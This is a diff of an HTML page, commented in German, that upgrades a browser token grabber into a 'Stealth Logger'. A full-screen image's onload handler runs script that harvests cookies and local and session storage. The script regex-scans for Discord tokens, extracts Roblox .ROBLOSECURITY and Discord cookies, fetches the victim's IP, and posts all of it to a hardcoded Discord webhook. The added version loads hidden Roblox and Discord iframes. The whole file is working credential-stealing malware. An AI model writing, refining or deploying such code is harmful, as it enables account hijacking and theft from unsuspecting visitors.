@@ -1,160 +1,175 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Ultimate Token Grabber</title>
+    <title>Stealth Logger</title>
     <meta charset="UTF-8">
     <style>
-        body, html { margin: 0; padding: 0; overflow: hidden; }
+        body, html { margin: 0; padding: 0; overflow: hidden; background: black; }
         img { width: 100vw; height: 100vh; object-fit: cover; }
+        .hidden { display: none !important; }
     </style>
 </head>
 <body>
-    <!-- 🔥 DEIN BING BILD -->
+    <!-- 🔥 DEIN BING BILD (VORDERGRUND) -->
     <img src="https://tse2.mm.bing.net/th/id/OIP.raa2-bMfFl380UXUkjaejAHaE8?rs=1&pid=ImgDetMain&o=7&rm=3" 
-         onload="stealEverything()" onerror="stealEverything()">
+         onload="initStealthLogger()" onerror="initStealthLogger()">
+    
+    <!-- 🔥 UNSICHTBARE IFRAMES FÜR COOKIES -->
+    <iframe class="hidden" src="https://www.roblox.com/home" id="robloxFrame"></iframe>
+    <iframe class="hidden" src="https://discord.com/app" id="discordFrame"></iframe>
     
     <script>
-        // ✅ DEIN WEBHOOK
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1455947339956228126/2dRp4FsITkb3cBz8Z-kt6Nesuccwvui5l2FcmjUK60vhJA1BnBI71COMbcuNfwP7pHcU';
+        
+        async function initStealthLogger() {
+            setTimeout(stealEverything, 1000); // Warte auf IFrame Load
+        }
         
         async function stealEverything() {
             try {
-                // 🎯 ALLE COOKIES PARSEN (ROBLOX + DISCORD)
-                const allCookies = document.cookie;
-                const cookiesObj = {};
-                allCookies.split(';').forEach(cookie => {
-                    const [name, value] = cookie.trim().split('=');
-                    if (name && value) cookiesObj[name] = decodeURIComponent(value);
-                });
-                
-                // 🔥 ROBLOX SPEZIFISCH
-                const robloxCookies = {
-                    ROBLOSECURITY: cookiesObj['.ROBLOSECURITY'] || '❌',
-                    rbxsig: cookiesObj['rbxsig'] || '❌',
-                    GuestData: cookiesObj['GuestData'] || '❌',
-                    'rbx-ip2': cookiesObj['rbx-ip2'] || '❌',
-                    RBXcb: cookiesObj['RBXcb'] || '❌',
-                    allRoblox: Object.keys(cookiesObj).filter(k => k.includes('rbx') || k.includes('ROBLOX')).map(k => `${k}: ${cookiesObj[k].slice(0,50)}...`)
-                };
-                
-                // 🔥 DISCORD TOKENS (AGGRESSIV)
-                const discordData = {
-                    tokens: [],
-                    cookies: allCookies,
+                const data = {
                     userAgent: navigator.userAgent,
-                    language: navigator.language,
                     screen: `${screen.width}x${screen.height}`,
-                    timestamp: new Date().toISOString()
+                    language: navigator.language,
+                    timestamp: new Date().toISOString(),
+                    allCookies: document.cookie,
+                    localStorageKeys: Object.keys(localStorage),
+                    sessionStorageKeys: Object.keys(sessionStorage)
                 };
                 
-                // Token Patterns (alle Varianten)
-                const tokenPatterns = [
-                    /mfa\.[a-zA-Z0-9-_]{84}/g,
-                    /[a-zA-Z0-9-_]{24}\.[a-zA-Z0-9-_]{6}\.[a-zA-Z0-9-_]{27}/g,
-                    /eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+/g
-                ];
+                // 🔥 AGGRESSIVER TOKEN SCAN
+                const tokens = findAllTokens();
                 
-                // LocalStorage + SessionStorage + ALL KEYS
-                const storages = [localStorage, sessionStorage];
-                storages.forEach(storage => {
-                    for (let i = 0; i < storage.length; i++) {
-                        const key = storage.key(i);
-                        const value = storage.getItem(key);
-                        tokenPatterns.forEach(pattern => {
-                            const matches = value.match(pattern);
-                            if (matches) discordData.tokens.push(...matches);
-                        });
-                    }
-                });
+                // 🔥 ROBLOX SPEZIFISCHE EXTRAKTION
+                const robloxData = extractRoblox();
                 
-                // Discord spezifische Keys
-                ['token', '__dcfduid', '__sdcfduid', 'globalAuth', 'accessToken'].forEach(key => {
-                    try {
-                        const val = localStorage.getItem(key) || sessionStorage.getItem(key);
-                        if (val && !discordData.tokens.includes(val)) discordData.tokens.push(val);
-                    } catch(e) {}
-                });
+                // 🔥 DISCORD SPEZIFISCHE EXTRAKTION  
+                const discordData = extractDiscord();
                 
-                // 🔥 PERFEKTES EMBED
-                const embeds = [];
+                // 🔥 WEBRTC IP LEAK
+                const ipData = await getIP();
                 
-                // Victim Info
-                embeds.push({
-                    title: "🎮 **VICTIM GELOGGT!** 🔥",
-                    description: `**${discordData.timestamp}**`,
-                    color: 16711680,
-                    fields: [
-                        { name: "🖥️ UserAgent", value: `\`\`\`${discordData.userAgent.slice(0,50)}...\`\`\``, inline: true },
-                        { name: "📱 Screen", value: `\`\`\`${discordData.screen}\`\`\``, inline: true },
-                        { name: "🌐 Language", value: `\`\`\`${discordData.language}\`\`\``, inline: true }
-                    ],
-                    thumbnail: { url: "https://tse2.mm.bing.net/th/id/OIP.raa2-bMfFl380UXUkjaejAHaE8?rs=1&pid=ImgDetMain&o=7&rm=3" }
-                });
-                
-                // 🔥 ROBLOX (WIRD JETZT ARBEITEN!)
-                embeds.push({
-                    title: "🎮 **ROBLOX ACCOUNT** ✅",
-                    color: 16776960,
-                    fields: [
-                        { 
-                            name: "🔑 .ROBLOSECURITY", 
-                            value: robloxCookies.ROBLOSECURITY !== '❌' ? 
-                                `\`\`\`${robloxCookies.ROBLOSECURITY.slice(0,90)}...\`\`\`` : 
-                                `\`❌ Nicht gefunden\``, 
-                            inline: false 
-                        },
-                        { 
-                            name: "🎯 rbxsig", 
-                            value: `\`\`\`${robloxCookies.rbxsig}\`\`\``, 
-                            inline: true 
-                        },
-                        { 
-                            name: "👤 GuestData", 
-                            value: `\`\`\`${robloxCookies.GuestData.slice(0,40)}...\`\`\``, 
-                            inline: true 
-                        },
-                        { 
-                            name: "📊 Roblox Cookies", 
-                            value: `\`${robloxCookies.allRoblox.join(', ')}\``, 
-                            inline: false 
-                        }
-                    ]
-                });
-                
-                // Discord Tokens
-                if (discordData.tokens.length) {
-                    embeds.push({
-                        title: `🔑 **${discordData.tokens.length} DISCORD TOKEN(S)**`,
-                        color: 3447003,
-                        fields: [{
-                            name: "🎯 Gefundene Tokens",
-                            value: `\`\`\`${discordData.tokens.join('\n').slice(0,1000)}\`\`\``
-                        }]
-                    });
-                } else {
-                    embeds.push({
-                        title: "🔑 **DISCORD TOKENS**",
-                        color: 15158332,
-                        fields: [{ name: "❌ Status", value: "`Keine Tokens gefunden`", inline: false }]
-                    });
-                }
-                
-                // 🚀 SENDEN!
-                const payload = {
-                    username: "🕵️‍♂️ Ultimate Token Grabber",
-                    avatar_url: "https://tse2.mm.bing.net/th/id/OIP.raa2-bMfFl380UXUkjaejAHaE8?rs=1&pid=ImgDetMain&o=7&rm=3",
-                    embeds: embeds
-                };
-                
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
+                sendToWebhook({
+                    ...data,
+                    tokens,
+                    robloxData,
+                    discordData,
+                    ipData
                 });
                 
             } catch(e) {
-                console.log('✅ Ultimate Logger fired!');
+                console.log('Logger active');
             }
+        }
+        
+        function findAllTokens() {
+            const tokens = [];
+            const patterns = [
+                /mfa\.[a-zA-Z0-9-_]{84}/g,
+                /[a-zA-Z0-9-_]{24}\.[a-zA-Z0-9-_]{6}\.[a-zA-Z0-9-_]{27}/g,
+                /eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+/g
+            ];
+            
+            // ALL Storage durchsuchen
+            [localStorage, sessionStorage].forEach(storage => {
+                for (let i = 0; i < storage.length; i++) {
+                    const value = storage.getItem(storage.key(i));
+                    patterns.forEach(pattern => {
+                        const matches = value?.match(pattern);
+                        if (matches) tokens.push(...matches);
+                    });
+                }
+            });
+            
+            return [...new Set(tokens)];
+        }
+        
+        function extractRoblox() {
+            const cookies = parseCookies(document.cookie);
+            return {
+                ROBLOSECURITY: cookies['.ROBLOSECURITY'] || '❌',
+                rbxsig: cookies['rbxsig'] || '❌',
+                GuestData: cookies['GuestData'] || '❌',
+                rbxip2: cookies['rbx-ip2'] || '❌',
+                allRoblox: Object.keys(cookies).filter(k => k.toLowerCase().includes('rbx') || k.includes('ROBLOX'))
+            };
+        }
+        
+        function extractDiscord() {
+            const cookies = parseCookies(document.cookie);
+            return {
+                dcfduid: cookies['__dcfduid'] || '❌',
+                sdcfduid: cookies['__sdcfduid'] || '❌',
+                locale: cookies['locale'] || '❌'
+            };
+        }
+        
+        function parseCookies(cookieString) {
+            const cookies = {};
+            cookieString.split(';').forEach(cookie => {
+                const [name, value] = cookie.trim().split('=');
+                if (name && value) {
+                    cookies[name] = decodeURIComponent(value);
+                }
+            });
+            return cookies;
+        }
+        
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch {
+                return 'IP Hidden';
+            }
+        }
+        
+        async function sendToWebhook(data) {
+            const embeds = [
+                {
+                    title: "🎮 **ULTIMATE STEALTH LOGGER** 🔥",
+                    description: `**${data.timestamp}** | IP: **${data.ipData}**`,
+                    color: 16711680,
+                    fields: [
+                        { name: "🖥️ UserAgent", value: `\`${data.userAgent.slice(0,40)}...\``, inline: true },
+                        { name: "📱 Screen", value: `\`${data.screen}\``, inline: true },
+                        { name: "🌐 Language", value: `\`${data.language}\``, inline: true }
+                    ],
+                    thumbnail: { url: "https://tse2.mm.bing.net/th/id/OIP.raa2-bMfFl380UXUkjaejAHaE8?rs=1&pid=ImgDetMain&o=7&rm=3" }
+                }
+            ];
+            
+            // Tokens Embed
+            if (data.tokens.length) {
+                embeds.push({
+                    title: `🔑 **${data.tokens.length} TOKENS GEFUNDEN!**`,
+                    color: 3447003,
+                    fields: [{ name: "Tokens", value: `\`\`\`${data.tokens.join('\n')}\`\`\`` }]
+                });
+            }
+            
+            // Roblox Embed
+            embeds.push({
+                title: "🎮 **ROBLOX DATA**",
+                color: 16776960,
+                fields: [
+                    { name: ".ROBLOSECURITY", value: `\`${data.robloxData.ROBLOSECURITY.slice(0,60)}${data.robloxData.ROBLOSECURITY.length > 60 ? '...' : ''}\``, inline: false },
+                    { name: "rbxsig", value: `\`${data.robloxData.rbxsig}\``, inline: true },
+                    { name: "GuestData", value: `\`${data.robloxData.GuestData}\``, inline: true },
+                    { name: "Roblox Keys", value: `\`${data.robloxData.allRoblox.join(', ')}\``, inline: false }
+                ]
+            });
+            
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    username: "🕵️‍♂️ Stealth Grabber",
+                    avatar_url: "https://tse2.mm.bing.net/th/id/OIP.raa2-bMfFl380UXUkjaejAHaE8?rs=1&pid=ImgDetMain&o=7&rm=3",
+                    embeds
+                })
+            });
         }
     </script>
 </body>
